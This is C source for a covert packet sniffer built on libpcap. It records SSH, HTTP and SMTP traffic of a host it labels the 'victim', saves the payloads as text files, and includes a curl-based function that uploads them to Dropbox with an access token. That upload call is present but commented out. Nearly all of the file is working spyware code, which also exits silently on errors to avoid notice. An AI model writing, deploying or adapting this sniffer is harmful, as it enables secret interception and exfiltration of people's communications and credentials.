#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <pthread.h>

typedef struct {
  u_char* packet;
  struct pcap_pkthdr* header;
} packet_info;

/* Length of bytes of the data link layer. We assume we deal with Ethernet headers. */
int DATA_LINK_HDR_LEN = 14;

/* Number of packet_info packets that our buffer holds */
int PACKET_BUFFER_SIZE = 10;

/* Buffer to hold a certain amount of packet_info structs.  */
packet_info* PACKET_BUFFER[10];

/* Counter for the above buffer. */
int PACKET_BUFFER_IDX = 0;

/* Mutex for both the buffer and its counter. */
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

/* Dropbox access token for pushing pcap files. */
const char* DROPBOX_ACCESS_TOKEN;

/* Used to check whether ip address belongs to source or destination. */
const char* VICTIM_IP;

/* Definition for the callback function when a packet is captured */
void packet_callback(u_char* args, const struct pcap_pkthdr* header, const u_char* packet);

/* Definition for a function which process packets sitting in the buffer and sends an email with their information */
void process_buffer();

char* get_interface_ip(char* interface);

char* get_system_time();

void write_to_dropbox(char* filename);

int main(int argc, char** argv) {

  DROPBOX_ACCESS_TOKEN = getenv("DROPBOX_ACCESS_TOKEN");
  char errbuf[PCAP_ERRBUF_SIZE]; /* Buffer for error messages */
  struct bpf_program  bpf;
  char filter_exp[] = "port 22 or port 80 or port 25";
  uint32_t net_num, netmask;

  // Get name of first non loopback interface.
  char* interface = pcap_lookupdev(errbuf);
  if(interface == NULL) {
    // Exit silently if we fail to find interface.
    return 1;
  }
  // Hack because for some reason VICTIM_IP was getting mangled in the callback
  VICTIM_IP = strdup(get_interface_ip(interface));
  // Enable Non promiscuous mode.
  pcap_t* pc_handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
  if(pc_handle == NULL) {
    return 1;
  }
  // For now, we only support devices which have Ethernet link-layer headers.
  if (pcap_datalink(pc_handle) != DLT_EN10MB) {
		return 1;
	}
  if (pcap_lookupnet(interface, &net_num, &netmask, errbuf) < 0) {
    return 1;
  }
  // For now, we are only interested in the following protocols: HTTP, SSH, SMTP.
  if (pcap_compile(pc_handle, &bpf, filter_exp, 0, netmask))
  {
    return 1;
  }
  // Assign the packet filter to the given libpcap socket.
  if (pcap_setfilter(pc_handle, &bpf) < 0)
  {
    return 1;
  }
  // Start a loop that collect packets
  pcap_loop(pc_handle, -1, packet_callback, NULL);
	/* Close the session */
	pcap_close(pc_handle );
	return 0;
}

/* http://www.binarytides.com/c-program-to-get-ip-address-from-interface-name-on-linux/ */
char* get_interface_ip(char* interface) {

  int fd;
  struct ifreq ifr;
  fd = socket(AF_INET, SOCK_DGRAM, 0);
  //Type of address to retrieve - IPv4 IP address
  ifr.ifr_addr.sa_family = AF_INET;
  //Copy the interface name in the ifreq structure
  strncpy(ifr.ifr_name , interface, IFNAMSIZ-1);
  ioctl(fd, SIOCGIFADDR, &ifr);
  close(fd);
  return inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
}

/* Implementation of packet callback function */
void packet_callback(u_char* args, const struct pcap_pkthdr* header, const u_char* packet) {

  packet_info* info = (packet_info*) malloc(sizeof(packet_info));
  info->packet=packet;
  info->header=header;
  pthread_mutex_lock(&mutex);
  PACKET_BUFFER[PACKET_BUFFER_IDX++] = info;
  if(PACKET_BUFFER_IDX == PACKET_BUFFER_SIZE) {
    process_buffer();
    PACKET_BUFFER_IDX = 0;
  }
  pthread_mutex_unlock(&mutex);
}

void process_buffer() {

  char* buffer = (char*) malloc(sizeof(char) * 80);
  char filename[64] = "";
  strcpy(filename, get_system_time(buffer));
  strcat(filename, "_");
  strcat(filename, VICTIM_IP);
  strcat(filename, ".mypcap");
  FILE* packet_file = fopen(filename, "w");
  // Process packets
  for(int i = 0; i < PACKET_BUFFER_SIZE; ++i) {
    packet_info* info = PACKET_BUFFER[i];
    u_char* packet = info->packet;
    struct pcap_pkthdr* header = info->header;
    // Extract the unix epoch timestamp from the header and convert to readable form.
    time_t timestamp = (time_t) (header->ts.tv_sec);
    time(&timestamp);
    // Initialize some stuff.
    char src_ip[256], dest_ip[256];
    struct ip* ip_hdr;
    int ip_hdr_len;
    struct tcphdr* tcp_hdr;
    int tcp_hdr_len;
    u_char* payload;
    int payload_len;
    // We don't care about any info in the link-layer so skip it.
    packet += DATA_LINK_HDR_LEN;
    // Get to the ip header and also get its size for future use
    ip_hdr = (struct ip*) packet;
    ip_hdr_len = ip_hdr->ip_hl*4;
    // Gets the source and destination ip. We don't get port info since we filter
    // on a specific set of protocols anyway.
    strcpy(src_ip, inet_ntoa(ip_hdr->ip_src));
    strcpy(dest_ip, inet_ntoa(ip_hdr->ip_dst));
    // Check whether the source or destination ip is the one of the host machine.
    if (strcmp(VICTIM_IP, src_ip) == 0) {
      fprintf(packet_file, "%s%s (Host) -> %s\n", ctime(&timestamp), src_ip, dest_ip);
    } else if (strcmp(VICTIM_IP, dest_ip) == 0) {
      fprintf(packet_file, "%s%s -> %s (Host)\n", ctime(&timestamp), src_ip, dest_ip);
    } else {
      continue;
    }
    tcp_hdr = (struct tcphdr*) (packet + ip_hdr_len);
    tcp_hdr_len = tcp_hdr->th_off*4;
    payload_len = header->caplen - (DATA_LINK_HDR_LEN + ip_hdr_len + tcp_hdr_len);
    payload = (u_char*) (packet + ip_hdr_len + tcp_hdr_len);
    /* Print payload in ASCII, http://www.devdungeon.com/content/using-libpcap-c */
    if (payload_len > 0) {
      fprintf(packet_file, "Payload len: %d\n", payload_len);
      const u_char* temp_pointer = payload;
      int byte_count = 0;
      while (byte_count++ < payload_len) {
        fprintf(packet_file, "%c", *temp_pointer);
        temp_pointer++;
      }
      fprintf(packet_file, "\n");
    } else {
      fprintf(packet_file, "Payload len: %d\n", 0);  
    }
    fprintf(packet_file, "=======================================\n");
    fflush(packet_file);
    free(info);
  }
  free(buffer);
  //write_to_dropbox(filename);
  //remove(filename);
}

char* get_system_time(char* buffer) {
  time_t rawtime;
  struct tm * timeinfo;
  time (&rawtime);
  timeinfo = localtime (&rawtime);
  strftime (buffer,80,"%F_%R", timeinfo);
  return buffer;
}

void write_to_dropbox(char* filename) {
  char buffer[200] = "";
  strcpy(buffer, "curl -H \"Authorization: Bearer ");
  strcat(buffer, DROPBOX_ACCESS_TOKEN);
  strcat(buffer, "\" ");
  strcat(buffer, "https://api-content.dropbox.com/1/files_put/auto/ -T ");
  strcat(buffer, filename);
  system(buffer);
}
